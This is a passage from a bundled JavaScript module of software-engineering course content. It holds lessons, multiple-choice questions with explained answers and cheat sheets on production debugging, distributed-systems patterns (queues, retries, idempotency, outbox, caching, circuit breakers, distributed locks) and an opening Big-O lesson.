static cache","The memory limit is too low; raising it will fix the problem for good"],answer:2,why:"If the low point after GC keeps rising, objects survive collection because something still references them. Take two memory dumps a few hours apart and compare what grew.",remember:"Watch the low point after GC, not the peaks."},{id:"debugging.resources.2",kind:"debug",difficulty:"hard",prompt:"Under load, latency grows to 30 s. CPU is 10%, the database is fine, and the number of threads keeps growing. You find this in a controller. What is the most likely cause?",code:{lang:"csharp",text:`public IActionResult Get(int id)
{
    var user = _client.GetUserAsync(id).Result;
    return Ok(user);
}`},choices:["Thread pool starvation: threads are blocked waiting on .Result","The database is overloaded, so every query waits a long time for locks","The JSON serializer is too slow when it writes large user objects","The garbage collector runs too often and pauses all the threads"],answer:0,why:"`.Result` blocks a thread while the HTTP call runs. Under load every thread is blocked, so new requests wait for a free thread. Make the action `async` and `await` the call.",remember:"Low CPU + growing threads + slow → look for `.Result` / `.Wait()`."},{id:"debugging.resources.3",kind:"perf",difficulty:"medium",prompt:"After a release, CPU is at 95% on all API servers and requests are slow. What is the best first step?",choices:["Add more memory to the servers so the GC runs less often","Increase the HTTP timeout so slow requests can still finish","Turn off all logging, because writing logs uses a lot of CPU","Profile the CPU (e.g. `dotnet-trace`) to see which code uses it"],answer:3,why:"A profile shows which methods burn the CPU. Combined with the diff of the release, you usually find the cause quickly. The other options do not touch the CPU problem."},{id:"debugging.resources.4",kind:"mcq",difficulty:"easy",prompt:"Memory goes from 300 MB to 800 MB, then GC brings it back to 300 MB. This repeats every few minutes, for weeks. Is it a leak?",choices:["Yes, because memory in a healthy app should never go up this much","Probably not: the low point stays at 300 MB, so GC works normally","Yes, because the GC has to run every few minutes to free memory","Yes, because a .NET web app should always stay under 500 MB"],answer:1,why:"A saw-tooth with a stable bottom is normal: objects are created, then collected. A leak shows a bottom that keeps rising."}]},{id:"debugging.production",title:"Debugging in production",summary:'No debugger, real users — and "works on my machine".',minutes:5,blocks:[{type:"text",text:"In production you usually **cannot** attach a debugger or set breakpoints. Pausing a real server stops real users. So the evidence must already be there: logs, metrics, traces, error reports."},{type:"list",items:["Search logs by correlation id or user id.","Check metrics: when did it start? Which servers?","Look at recent changes: deploys, config, feature flags, data imports.","Reproduce in a test environment with similar data (careful with private data).","If logs are missing, add **targeted** logs around the suspect code and deploy."]},{type:"text",text:`A **feature flag** is a switch that turns code on or off without a deploy. New feature breaks? Turn the flag off, users are safe, and now you can investigate calmly.
**Mitigate first, find the root cause second.**`},{type:"text",text:'**"Works on my machine"** means one thing: something is **different**. Find the difference.'},{type:"diagram",text:`Your laptop            Production
Debug build            Release build
appsettings.Dev.json   env variables, secrets
Windows                Linux container
Time zone UTC+7        Time zone UTC
50 test rows           50 million real rows
Admin user             Normal user permissions
1 user                 2 000 users at once`},{type:"example",title:"File not found, only in prod",text:"The code loads `Templates/Invoice.html`. The file is named `templates/invoice.html`. On Windows the file system ignores case, so it works. In the Linux container it does not."}],remember:"In prod: mitigate first, then find what is different. Evidence beats breakpoints.",questions:[{id:"debugging.production.1",kind:"debug",difficulty:"medium",prompt:'A report "Orders created today" shows wrong orders around midnight for users in Vietnam (UTC+7). It works on the developer\'s laptop in Hanoi. The code uses `DateTime.Now`. Most likely cause?',choices:["The database is corrupted for rows that were saved near midnight","The report caches its results for 24 hours and shows old data","Vietnamese users use a different calendar on their phones",'The server runs in UTC, so its "today" starts 7 hours later'],answer:3,why:'`DateTime.Now` uses the time zone of the machine. The laptop is in UTC+7, the server in UTC, so "today" means different hours. Store times in UTC and convert to the user\'s time zone on purpose.',remember:"Time bugs that only happen in prod → check time zones."},{id:"debugging.production.2",kind:"scenario",difficulty:"easy",prompt:"A new recommendations feature is behind a feature flag. Since it was turned on, the product page throws errors for 20% of users. What do you do first?",choices:["Attach a debugger to the production server","Turn the flag off, then investigate with the logs","Restore yesterday's database backup","Ask users to clear their browser cache"],answer:1,why:"The flag stops the damage in seconds without a deploy. Then you can find the cause calmly, with the logs from the failing requests.",remember:"Mitigate first, root cause second."},{id:"debugging.production.3",kind:"debug",difficulty:"easy",prompt:"Image loading works on your Windows machine. In the Linux Docker container it fails: `File not found: Assets/Logo.png`. The file on disk is `assets/logo.png`. Cause?",choices:["Linux file paths are case-sensitive, Windows paths are not","The container user has no read permission for the assets folder","The image file is too big for the container's memory limit","Linux needs backslashes in file paths, so the path is not found"],answer:0,why:"On Linux `Assets/Logo.png` and `assets/logo.png` are two different paths. Windows treats them as the same, which hides the bug locally."},{id:"debugging.production.4",kind:"scenario",difficulty:"hard",prompt:"A bug happens only in production. You cannot reproduce it locally, and the current logs show nothing useful. What is the best next move?",choices:["Guess the cause and ship a fix to see if it helps","Attach a debugger with breakpoints to a live server","Wait and hope the bug disappears on its own","Add targeted logs around the suspect code, then deploy"],answer:3,why:"If the evidence is missing, create it. Log the inputs, ids and which branch the code took. The next time it happens you have facts instead of guesses."}]}],cheatSheet:[{title:"The method",items:[{term:"Reproduce",meaning:"Make it fail on purpose — or find the exact failing request"},{term:"What changed?",meaning:"Deploy, config, data, traffic — at the time it started"},{term:"Hypothesis",meaning:'Specific and testable: "X fails because Y"'},{term:"One change at a time",meaning:"Otherwise you do not know what fixed it"},{term:"Verify",meaning:"Bug gone AND nothing else broken"},{term:"Mitigate first",meaning:"Flag off / roll back, then find the root cause"}]},{title:"Reading errors and logs",items:[{term:"Top frame",meaning:"Where the exception was thrown"},{term:"First frame in your code",meaning:"Usually where to start looking"},{term:"Inner exception",meaning:"Often the real cause — read the whole chain"},{term:"throw; vs throw ex;",meaning:"`throw;` keeps the stack trace, `throw ex;` resets it"},{term:"catch { }",meaning:"Swallowed exception — invisible bug"},{term:"Structured log",meaning:"Values stored as fields: filter, count, graph"},{term:"Correlation id",meaning:"One id per request, on every log line, in every service"}]},{title:"Metrics",items:[{term:"p50",meaning:"Median: the typical request"},{term:"p95 / p99",meaning:"The slow tail — where users suffer"},{term:"Average",meaning:"Hides a few very slow requests"},{term:"Golden signals",meaning:"Traffic, errors, latency, saturation"}]},{title:"Symptom → first suspect",items:[{term:"High CPU",meaning:"Hot code: profile it"},{term:"Low CPU + slow",meaning:"Waiting on IO: DB, HTTP, locks"},{term:"Low CPU + threads growing",meaning:"Thread pool starvation: `.Result` / `.Wait()`"},{term:"Memory low point rising",meaning:"Leak: static list, unbounded cache, event handler"},{term:"Connection pool timeout",meaning:"Slow queries or connections not disposed"},{term:"Works on my machine",meaning:"Config, OS, time zone, data size, permissions differ"}]}]},f=Object.freeze(Object.defineProperty({__proto__:null,default:w},Symbol.toStringTag,{value:"Module"})),b={id:"distributed-systems",title:"Distributed Systems",emoji:"🌍",tagline:"Queues, retries, duplicates — when the network lies",lessons:[{id:"distributed-systems.queues",title:"Message queues and events",summary:"Do the slow work later, somewhere else.",minutes:3,blocks:[{type:"text",text:"A **message queue** is a to-do list between services. A **producer** puts a message in. A **consumer** (worker) takes it out and processes it later."},{type:"diagram",text:`API ──► [ queue: msg msg msg ] ──► Worker
 "OrderPlaced"                   sends email,
 returns 200 fast                makes invoice`},{type:"list",items:["**Decouple** — the API does not care if the email service is down right now. The message waits.","**Absorb spikes** — 10,000 orders in one minute? The queue grows, workers catch up.","**Scale** — add more workers to process faster."]},{type:"compare",left:{title:"Command",items:['"Do this": `SendInvoice`',"One handler","Sender expects it to happen"]},right:{title:"Event",items:['"This happened": `OrderPlaced`',"Zero, one or many listeners","Sender does not know who reacts"]}},{type:"text",text:"A consumer **acknowledges** (acks) a message when it is done. Until the ack, the queue keeps the message. If the worker dies, the queue gives the message to someone else."}],remember:"Queue = to-do list between services. No ack → the message comes back.",questions:[{id:"distributed-systems.queues.1",kind:"scenario",difficulty:"easy",prompt:"Checkout calls the email service directly. When the email service is down, customers **cannot place orders**. What change helps most?",choices:["Give the email service a bigger server","Put the email on a queue; a worker sends it","Retry the email call up to 100 times in checkout","Stop sending order confirmation emails"],answer:1,why:"With a queue, checkout only needs the queue to be up. The email is sent when the email service comes back. A failing side task no longer breaks the main flow.",remember:"Queues stop a slow side task from breaking the main flow."},{id:"distributed-systems.queues.2",kind:"compare",difficulty:"medium",prompt:"After an order is placed, billing, shipping and analytics all need to react. Next month a loyalty service will join. Which message design fits better?",choices:["Three commands from the order service: `CreateInvoice`, `ShipOrder`, `TrackSale`","One `OrderPlaced` event that each service subscribes to"],answer:1,why:"With an event, the order service does not need to know its listeners. Loyalty can subscribe later without changing the order service."},{id:"distributed-systems.queues.3",kind:"debug",difficulty:"medium",prompt:"One message makes the worker throw every time (bad data). The worker keeps retrying it forever, and the messages behind it are not processed. What is the usual fix?",choices:["Restart the queue server so the message is dropped","Catch the exception and ack it silently","After N tries, move it to a dead-letter queue","Add more workers so others get processed"],answer:2,why:'A "poison message" never succeeds. A dead-letter queue parks it so others can flow, and a human can inspect it later. Acking silently would lose it without anyone knowing.',remember:"Poison message → dead-letter queue, not an endless loop."}]},{id:"distributed-systems.retries",title:"Timeouts, retries and duplicates",summary:"The network fails in strange ways.",minutes:4,blocks:[{type:"text",text:`In one process, a method call either returns or throws. Over a network there is a third result: **"I don't know."**`},{type:"diagram",text:`You ──request──► Payment service
    ✗ timeout
Did it fail before charging?   maybe
Did it charge, then the reply was lost?   maybe`},{type:"text",text:'A **timeout** does not mean "it failed". It means "I stopped waiting". The work may have happened.'},{type:"text",text:"Queues have the same problem. Most queues give **at-least-once delivery**: a message is delivered one or more times, never zero (after it was accepted)."},{type:"diagram",text:`Worker: receive msg ─► process ─► 💥 crash
                              (no ack sent)
Queue:  no ack → deliver again ─► process AGAIN`},{type:"list",items:["Always set a **timeout** on network calls. Without one, a stuck call can wait forever.","Retry only **temporary** errors (timeout, 503). A 400 Bad Request will fail again.","Use **exponential backoff + jitter**: wait 1 s, 2 s, 4 s… plus a random bit, so clients don't retry in sync.","Assume every message and every retried request can arrive **twice**."]}],remember:"Timeout = unknown result. Retries + at-least-once = duplicates.",questions:[{id:"distributed-systems.retries.1",kind:"scenario",difficulty:"easy",prompt:"Your worker receives a message, processes it, then crashes **before acknowledging it**. What might happen?",choices:["It is delivered again and processed twice","It is lost, because the worker already received it","The queue marks it done after a timeout","The queue notices the crash and rolls back the work"],answer:0,why:"The queue never got the ack, so it thinks the work was not done and redelivers it. This is at-least-once delivery. Your handler must be safe to run twice.",remember:"No ack = it comes back."},{id:"distributed-systems.retries.2",kind:"scenario",difficulty:"medium",prompt:"You call a payment API to charge $50. After 30 seconds you get a timeout. What is the safest next step?",choices:["Assume it failed and charge again with a new request","Retry using the same idempotency key as before","Assume it succeeded and ship the order","Show the user an error and forget about it"],answer:1,why:"The charge may or may not have happened. Retrying with the same key lets the provider return the first result instead of charging twice. Checking the payment status first also works.",remember:"After a timeout, find out — don't guess."},{id:"distributed-systems.retries.3",kind:"perf",difficulty:"hard",prompt:"A service has a 10-second outage. When it comes back, it is instantly knocked down again by a huge wave of traffic. All clients retry every 1 second with no limit. What would you change?",choices:["Retry every 100 ms so clients recover faster","Remove the client timeouts so calls just wait","Always return 200 while starting up","Backoff with jitter, plus a retry limit"],answer:3,why:'Thousands of clients retrying at the same moment create a "retry storm". Backoff spreads retries out over time, jitter stops them syncing up, and a limit stops endless retrying.'},{id:"distributed-systems.retries.4",kind:"debug",difficulty:"medium",prompt:"The `ReportService` calls `PricingService` with no timeout. One day pricing hangs. Soon, report requests pile up and the report service runs out of memory. What is the root cause?",choices:["No timeout, so requests wait and pile up","Pricing returns too much data","Reports are not cached, so each one is rebuilt","A memory leak in the report service JSON code"],answer:0,why:"With no timeout, every request waits on the hung service and holds its memory and connections. A timeout lets the call fail fast and free its resources.",remember:"Every network call needs a timeout."}]},{id:"distributed-systems.idempotency",title:"Idempotency: safe to do twice",summary:"Duplicates will happen. Make them harmless.",minutes:4,blocks:[{type:"text",text:"An operation is **idempotent** when doing it twice has the same effect as doing it once."},{type:"compare",left:{title:"Idempotent ✅",items:["`SET Status = 'Paid'`","`DELETE WHERE Id = 7`","PUT the full profile"]},right:{title:"Not idempotent ⚠️",items:["`Balance = Balance + 10`","INSERT a new payment row","Send an email"]}},{type:"text",text:"Most real handlers are not naturally idempotent. So the **consumer** remembers what it already did, using a **message id** or an **idempotency key**."},{type:"code",code:{lang:"csharp",text:`async Task Handle(PaymentReceived msg)
{
    using var tx = await db.Database.BeginTransactionAsync();
    // ProcessedMessages has a UNIQUE key on MessageId
    if (await db.ProcessedMessages.AnyAsync(
            p => p.MessageId == msg.Id))
        return;                     // seen it → skip

    var order = await db.Orders.FindAsync(msg.OrderId);
    order.AmountPaid += msg.Amount;
    db.ProcessedMessages.Add(new(msg.Id));
    await db.SaveChangesAsync();    // both or neither
    await tx.CommitAsync();
}`}},{type:"text",text:'Key detail: save the "processed" mark in the **same transaction** as the business change. The **unique key** catches the rare case where two workers get the same message at the same moment.'},{type:"example",title:"APIs too",text:"Stripe-style payment APIs accept an `Idempotency-Key` header. The client creates one key per purchase and sends the same key on every retry. The server returns the stored result instead of charging again."}],remember:"Idempotent = twice is the same as once. Dedupe by message id.",questions:[{id:"distributed-systems.idempotency.1",kind:"scenario",difficulty:"easy",prompt:"A `PointsEarned` handler runs `UPDATE Users SET Points = Points + 100`. The queue delivers the same message twice. What happens, and what is a good fix?",choices:["100 points; the queue removes duplicates for you","The second update fails; add a retry policy","200 points; skip message ids already processed","200 points; purge the queue after each message"],answer:2,why:"`+ 100` is not idempotent, so the duplicate adds points again. Storing processed message ids (with a unique key) lets the handler skip the second copy."},{id:"distributed-systems.idempotency.2",kind:"compare",difficulty:"medium",prompt:"Your handler marks a message as processed. Which approach is safer?",choices:["Save the order change and the message id in one transaction","Commit the order change, then save the message id separately"],answer:0,why:"With two transactions, a crash between them leaves the order updated but the id not stored, so a redelivery applies it again. One transaction (plus a unique key on the id) makes both happen together.",remember:'Mark "done" in the same transaction as the work.'},{id:"distributed-systems.idempotency.3",kind:"scenario",difficulty:"medium",prompt:"A mobile app sends `POST /orders`. On a bad network the app retries, and some customers get **two identical orders**. What is the best fix?",choices:["Turn off automatic retries in the mobile app","Block a customer from ordering twice per day","Make the server respond faster so nobody retries","Send an idempotency key per checkout attempt"],answer:3,why:"The first request probably succeeded but the response was lost. With one key per checkout, the server sees a repeated key and returns the existing order. Disabling retries just turns lost responses into failed orders."},{id:"distributed-systems.idempotency.4",kind:"debug",difficulty:"hard",prompt:"A handler checks `if (alreadyProcessed(msg.Id)) return;` and later saves the id. There is **no unique constraint** on the id. Rarely, a message is still processed twice. Why?",choices:["The `alreadyProcessed` query is too slow under load","Two workers checked before either saved the id","Message ids are not unique across producers","The queue ignores acks from this worker"],answer:1,why:"Two workers got the same message at once. Check-then-insert is a race between them. A unique constraint on the message id makes the second insert fail, so only one wins.",remember:"Let a unique constraint be the final judge."}]},{id:"distributed-systems.consistency",title:"Eventual consistency and the outbox",summary:"Data that is correct… a bit later.",minutes:4,blocks:[{type:"text",text:"**Eventual consistency** means: different parts of the system may disagree for a short time, but they will agree once all messages are processed."},{type:"example",title:"Example",text:'You place an order. The Orders service saves it right away. The "My orders" search page is filled by an event, 2 seconds later. For those 2 seconds, the search page does not show your new order.'},{type:"text",text:"Now a classic trap: you must **save to the database** and **publish an event**. These are two different systems. What if one succeeds and the other fails?"},{type:"diagram",text:`save order ✅ ─► publish event ❌ (broker down)
  → order exists, nobody ships it

publish event ✅ ─► save order ❌ (DB error)
  → shipping ships an order that doesn't exist`},{type:"text",text:"The **outbox pattern** fixes this. Save the event in an `Outbox` table **in the same DB transaction** as the order. A background job reads the outbox and publishes."},{type:"diagram",text:`┌── one DB transaction ──┐
│ INSERT Orders          │
│ INSERT Outbox (event)  │
└────────────────────────┘
          │
 relay job: read Outbox ─► publish ─► mark sent`},{type:"text",text:'If the relay crashes after publishing but before "mark sent", it publishes again. So consumers still need to be **idempotent**.'}],remember:"DB + broker can't share a transaction → outbox table + idempotent consumers.",questions:[{id:"distributed-systems.consistency.1",kind:"scenario",difficulty:"medium",prompt:"Code: `await db.SaveChangesAsync(); await bus.PublishAsync(new OrderPlaced(...));`. The bus is down for 1 minute. What happens to orders saved in that minute?",choices:["Their save is rolled back automatically","The bus buffers them and sends them later","`SaveChanges` waits until the bus is back","Saved, but no event is ever sent for them"],answer:3,why:"The DB commit already happened. The publish fails afterwards, and nothing tries again. Downstream services never hear about these orders.",remember:'Save + publish is a "dual write" — one can fail alone.'},{id:"distributed-systems.consistency.2",kind:"compare",difficulty:"hard",prompt:'You need "order saved" and "event published" to never get out of sync. Which design is more reliable?',choices:["Order + outbox row in one transaction; a relay publishes","Publish first, then save; if the save fails, publish `OrderCancelled`","Wrap save and publish in try/catch, log errors"],answer:0,why:"The outbox turns two writes into one DB transaction. The relay retries until the broker accepts the event. The other options still lose or invent events when a crash happens at the wrong moment."},{id:"distributed-systems.consistency.3",kind:"debug",difficulty:"easy",prompt:'Users report: "I created a project, but it is not in the project list. After a few seconds it appears." The list is built from events. What is the most likely explanation?',choices:["The project was saved twice by a retry","The browser cached the old project list response","The list is updated a moment after the write","A database deadlock delayed the insert"],answer:2,why:"Eventual consistency: the write is done, but the event that updates the list takes a moment. A common UX fix: show the new item from the create response right away."},{id:"distributed-systems.consistency.4",kind:"scenario",difficulty:"hard",prompt:"You use the outbox pattern. The relay publishes an event, then crashes before marking the row as sent. What happens next, and what must consumers do?",choices:["The event is lost; consumers must poll","It is published again; consumers must dedupe","The DB transaction is rolled back; consumers do nothing","The broker removes the duplicate; consumers do nothing"],answer:1,why:"After restart the row still looks unsent, so it is published again. The outbox gives at-least-once publishing, not exactly-once. Consumers dedupe by event id."}]},{id:"distributed-systems.caching",title:"Caching: fast, until it lies",summary:"Stale data, invalidation and stampedes.",minutes:4,blocks:[{type:"text",text:"A cache keeps a copy of data close by, so you don't ask the database every time. The price: the copy can be **stale** (old)."},{type:"diagram",text:`Cache-aside (most common)
read:  cache hit?  ─yes─► return it
           │no
           ▼
       load from DB ─► put in cache (TTL 5 min) ─► return

write: update DB ─► delete the cache key`},{type:"list",items:["**TTL** (time to live) — the copy expires after N minutes. A safety net: stale data cannot live forever.","**Invalidation** — when data changes, delete the cached copy. Easy to forget one place.","**Per-server memory cache** — each API instance has its own copy. Deleting it on one server does not clear the others."]},{type:"text",text:"**Cache stampede**: a very popular key expires. 1,000 requests miss at the same moment and **all** hit the database to rebuild it."},{type:"list",items:["Let only **one** request rebuild the key; others wait or get the old value.","Add random **jitter** to TTLs so many keys don't expire together.","Refresh popular keys **before** they expire."]}],remember:'Every cache needs an answer to: "how stale is OK, and who clears it?"',questions:[{id:"distributed-systems.caching.1",kind:"debug",difficulty:"medium",prompt:"You run 4 API instances, each with an in-memory cache of product prices. An admin changes a price; the code deletes the cache key. Some users still see the old price for up to 10 minutes. Why?",choices:["The database update was slow to commit","Browsers cache the price on the client","Only one instance's copy was deleted","The TTL is too short for this data"],answer:2,why:"Each instance has its own memory. Only the instance that handled the admin request cleared its copy; the other three keep the old price until their TTL expires. Use a shared cache (e.g. Redis) or broadcast invalidation.",remember:"In-memory cache × N servers = N copies to invalidate."},{id:"distributed-systems.caching.2",kind:"perf",difficulty:"hard",prompt:"Every hour, at exactly the same minute, the database CPU spikes to 100% for a few seconds. The home page data is cached with a fixed 60-minute TTL and is requested 2,000 times per second. What is the likely cause?",choices:["A scheduled database backup runs every hour","The hot key expires; all requests hit the DB","The home page query is missing an index on a column","Many users log in at that same minute"],answer:1,why:"A cache stampede. When the popular key expires, every request misses together and runs the same expensive query. Let one request rebuild it, serve stale meanwhile, or refresh early.",remember:"Hot key expires → stampede."},{id:"distributed-systems.caching.3",kind:"compare",difficulty:"medium",prompt:"When a product changes, what should the code do with the cached product?",choices:["Leave it; the 24-hour TTL will fix it","Update the cache first, then update the DB","Update the DB, then delete the cache key"],answer:2,why:"Deleting the key means the next read loads fresh data. Updating the cache first leaves wrong data if the DB write fails, and waiting for the TTL shows old data for up to a day."},{id:"distributed-systems.caching.4",kind:"scenario",difficulty:"medium",prompt:"Product wants to cache the **account balance** shown before a money transfer for 10 minutes to reduce DB load. What is the main concern?",choices:["Users may approve transfers on an old balance","Caches cannot store `decimal` values safely","Redis is too slow for data read this often","A 10-minute TTL is too short to reduce DB load"],answer:0,why:"Money decisions need fresh data. Stale data is fine for a product description, not for a balance used to approve a transfer. Cache what can be a little old; read critical data fresh.",remember:'Ask "what if this is 10 minutes old?" before caching.'}]},{id:"distributed-systems.failures",title:"Cascading failures and circuit breakers",summary:"One slow service can take everything down.",minutes:4,blocks:[{type:"text",text:"A **cascading failure**: one service gets slow, its callers wait and pile up, then **they** fail, and so on up the chain."},{type:"diagram",text:`Web ──► Orders ──► Inventory (slow 🐢)
             │ waiting... waiting...
             ▼
   Orders: all threads / connections busy
             ▼
   Web: Orders times out → whole site down`},{type:"text",text:"A **circuit breaker** stops calling a service that keeps failing. Like the fuse in your house."},{type:"diagram",text:`CLOSED ──(too many failures)──► OPEN
  ▲   calls go through         fail fast, no call
  │                                  │ after 30 s
  └──(test call OK)── HALF-OPEN ◄────┘
                      let 1 test call through`},{type:"list",items:["**Timeouts** — stop waiting on a slow call.","**Circuit breaker** — stop calling a broken service for a while; give it time to recover.",'**Fallback** — return something useful: cached data, a default, "try later".',"**Bulkhead** — separate resource pools, so one bad dependency cannot use all threads."]},{type:"text",text:"In .NET, Polly (or `Microsoft.Extensions.Http.Resilience`) gives you timeouts, retries and circuit breakers for `HttpClient`."}],remember:"Fail fast beats wait forever. Timeouts + circuit breaker + fallback.",questions:[{id:"distributed-systems.failures.1",kind:"scenario",difficulty:"medium",prompt:"The product page calls a recommendations service. It has been failing for 2 minutes and each call takes 10 s to time out. Product pages now take 10 s too. What should happen?",choices:["Raise the timeout to 60 s so calls can finish","Retry each failed call 5 times before giving up","Open a circuit breaker and skip recommendations","Keep calling it every time — it might come back"],answer:2,why:"Recommendations are optional. An open circuit fails fast instead of waiting 10 s each time, and the page shows without them. Retrying or waiting longer makes it worse.",remember:"Optional dependency down → fail fast and degrade."},{id:"distributed-systems.failures.2",kind:"mcq",difficulty:"easy",prompt:"What does a circuit breaker in the **half-open** state do?",choices:["Blocks all calls forever","Sends every call twice to be safe","Replays all calls that failed before","Lets a few test calls through"],answer:3,why:"After the open period, half-open lets a little traffic through to check if the service has recovered. Success closes the circuit; failure opens it again."},{id:"distributed-systems.failures.3",kind:"debug",difficulty:"hard",prompt:"Your API calls two services: Payments and Avatars, using one shared `HttpClient` connection pool. Avatars becomes very slow. Soon **payments** also time out, even though Payments is healthy. Why?",choices:["Slow Avatar calls use up the shared pool","Payments secretly depends on Avatars internally","Payments is rate-limiting you","`HttpClient` can only call one host at a time"],answer:0,why:"Slow calls hold connections and threads. If both share the same limited resources, one bad dependency starves the other. Separate pools (bulkheads) and short timeouts keep the damage contained.",remember:"Isolate dependencies so one can't sink the ship."}]},{id:"distributed-systems.locks",title:"Distributed locks",summary:"When `lock` is not enough.",minutes:3,blocks:[{type:"text",text:"C#'s `lock` only works **inside one process**. When your app runs on 3 servers, each server has its own lock. They don't see each other."},{type:"diagram",text:`Server 1: lock ✅ ─► run "send invoices"
Server 2: lock ✅ ─► run "send invoices"
Server 3: lock ✅ ─► run "send invoices"
        → customers get 3 invoices`},{type:"text",text:"A **distributed lock** lives in a shared place: Redis, a database row, or a blob lease. Only one server can hold it."},{type:"text",text:"Distributed locks have a **lease** (expiry), so a crashed server does not hold the lock forever. But this creates a trap: if the holder is slow (long GC pause, slow network) longer than the lease, the lock expires and a **second** server takes it. Now two think they own it."},{type:"list",items:["Prefer a **database guarantee** when you can: a unique constraint, or `UPDATE ... WHERE Status = 'Pending'` and check the row count.","Use a distributed lock to **avoid duplicate work**, but keep the work idempotent in case two run anyway.","Pick a lease clearly longer than the job, or renew it while working."]}],remember:"Many servers → `lock` does nothing. Prefer DB guarantees; locks can expire.",questions:[{id:"distributed-systems.locks.1",kind:"scenario",difficulty:"easy",prompt:"A nightly job is a hosted service in your API. You scale the API from 1 to 3 instances. The next morning, customers have **3 copies** of their invoice. Why?",choices:["The queue duplicated the invoice messages","The database replicated the invoice rows","Each instance ran its own copy of the job","The email provider retried each send 3 times"],answer:2,why:'Each instance runs the same background service. Make sure only one runs it: a distributed lock, a separate single scheduler, or "claim" rows in the DB first.',remember:"Scaling out = every background job runs N times."},{id:"distributed-systems.locks.2",kind:"compare",difficulty:"medium",prompt:"Two workers may try to ship the same order. Which approach is more reliable?\nThe conditional update is `UPDATE Orders SET Status = 'Shipping' WHERE Id = @id AND Status = 'Paid'`.",choices:["The conditional update; ship only if 1 row changed","A `static` lock object and `lock` around the shipping method"],answer:0,why:"Workers usually run in different processes, so a C# `lock` does not stop them. The conditional update is atomic in the database: only one worker can change the row.",remember:"Let the database decide who wins."},{id:"distributed-systems.locks.3",kind:"debug",difficulty:"hard",prompt:"A job takes a Redis lock with a **30-second** expiry, then runs an import. Usually the import takes 10 s, but on big days it takes 90 s. On those days the data is imported twice. Why?",choices:["Redis restarted and forgot the lock on big days","The lock expired; another instance took it","Redis does not support expiring locks","The import has a retry loop that runs it twice"],answer:1,why:"The lease ran out while the first job was still working. A second instance saw a free lock and started too. Renew the lease while working, set it well above the worst case, and make the import idempotent.",remember:"A lock with expiry can expire while you still need it."}]}],cheatSheet:[{title:"Messaging",items:[{term:"Queue",meaning:"To-do list between services; consumer acks when done"},{term:"Event vs command",meaning:'"This happened" (many listeners) vs "do this" (one handler)'},{term:"At-least-once",meaning:"Message may arrive twice — no ack → redelivered"},{term:"Dead-letter queue",meaning:"Where poison messages go after N failed tries"},{term:"Outbox",meaning:"Save event in DB with the data; a relay publishes it later"}]},{title:"Failures",items:[{term:"Timeout",meaning:"Result unknown — it may have succeeded"},{term:"Retry",meaning:"Only temporary errors; exponential backoff + jitter + max tries"},{term:"Idempotency key",meaning:"Same key on retry → server returns first result, no double work"},{term:"Idempotent consumer",meaning:"Store processed message ids, unique key, same transaction"},{term:"Cascading failure",meaning:"Slow service → callers pile up → they fail too"},{term:"Circuit breaker",meaning:"Closed → open (fail fast) → half-open (test) → closed"},{term:"Bulkhead",meaning:"Separate pools so one dependency can't use all resources"}]},{title:"Data",items:[{term:"Eventual consistency",meaning:"Parts disagree for a moment, then catch up"},{term:"Cache-aside",meaning:"Miss → load DB → store with TTL; on write delete the key"},{term:"Stale data",meaning:"Cached copy older than the DB — decide how old is OK"},{term:"Cache stampede",meaning:"Hot key expires → everyone hits the DB; rebuild once"},{term:"Distributed lock",meaning:"Shared lock (Redis/DB) with a lease; can expire mid-work"}]}]},k=Object.freeze(Object.defineProperty({__proto__:null,default:b},Symbol.toStringTag,{value:"Module"})),v={id:"performance",title:"Big-O & Performance",emoji:"⚡",tagline:"Spot the code that gets slow at scale",lessons:[{id:"performance.growth",title:"Big-O: how work grows",summary:'Not "how fast", but "how much slower with more data".',minutes:4,blocks:[{type:"text",text:`**Big-O** answers one question: "If the data gets 10× bigger, how much more work does my code do?"
It is not about exact milliseconds. It is about the **shape** of the growth.`},{type:"diagram",text:`n = number of items

             n = 10   n = 1,000   n = 1,000,000
O(1)              1           1               1
O(log n)         ~3         ~10             ~20
O(n)             10       1,000       1,000,000
O(n log n)      ~33     ~10,000     ~20,000,000
O(n²)           100   1,000,000            10¹²
                                    (a trillion!)`},{type:"list",items:["**O(1)** — constant. Same work at any size: `dict[key]`, `arr[5]`.","**O(log n)** — halves the problem each step: binary search, a database index. 1 million items → ~20 steps.","**O(n)** — one pass over the data: a simple loop, `.includes`, `List.Contains`.","**O(n log n)** — a good sort: `Array.prototype.sort`, `List<T>.Sort`, LINQ `OrderBy`.","**O(n²)** — a loop inside a loop over the same data. Fine for 100 items, painful for 100,000."]},{type:"example",title:'The "100 items" trap',text:`100 items: O(n) → 100 operations, O(n²) → 10,000. Both feel instant.
100,000 items: O(n) → 100,000, O(n²) → 10 billion. One is still instant. The other freezes your API.
Small test data hides O(n²).`},{type:"text",text:"Big-O drops the small details. O(2n) is still O(n), and O(n² + n) is still O(n²). Only the part that grows fastest matters when n is big."}],remember:"Big-O is not speed. It is how the work grows when the data grows.",questions:[{id:"performance.growth.1",kind:"mcq",difficulty:"medium",prompt:"An O(n²) function takes 1 second for 10,000 items. Roughly how long for 100,000 items?",choices:["~2 seconds","~10 seconds","~100 seconds","~1,000 seconds"],answer:2,why:"10× more data with O(n²) means 10² = 100× more work. 1 second becomes about 100 seconds.",remember:"O(n²): 10× data → 100× time."},{id:"performance.growth.2",kind:"mcq",difficulty:"easy",prompt:"You use binary search on a **sorted** array of 1 billion items. About how many steps does it need?",choices:["~30","~1,000","~1 million","~1 billion"],answer:0,why:"Each step throws away half. 2³⁰ is about 1 billion, so ~30 halvings are enough. That is the magic of O(log n)."},{id:"performance.growth.3",kind:"scenario",difficulty:"medium",prompt:"A report works fine with 200 test customers. Production has 400,000 customers (2,000× more). The code compares every customer with every other customer. What should you expect?",choices:["About 2,000× more work, same as the data","The same speed — CPUs are fast enough","About 4 million× more work — likely unusable","A compile error once the data is big"],answer:2,why:"Comparing every item with every other item is O(n²). 2,000× more data → 2,000² = 4,000,000× more work.",remember:"Test with production-sized data before you trust a nested loop."},{id:"performance.growth.4",kind:"truefalse",difficulty:"medium",prompt:"An O(n) algorithm is always faster than an O(n²) algorithm.",choices:["True","False"],answer:1,why:"Big-O ignores the cost of each step. For small n, an O(n²) loop over memory can beat an O(n) loop that makes a network call per item. Big-O tells you who wins **as n grows**."}]},{id:"performance.reading-code",title:"Spot the Big-O in code",summary:"Add loops that follow each other, multiply loops inside each other.",minutes:4,blocks:[{type:"text",text:"You do not need math. Look for **loops**, and look at **what each loop runs over**."},{type:"code",code:{lang:"ts",text:`// O(1): no loop — size of users does not matter
const first = users[0];

// O(n): one loop over the data
for (const u of users) total += u.age;

// Still O(n): two loops one AFTER another → n + n
for (const u of users) countActive(u);
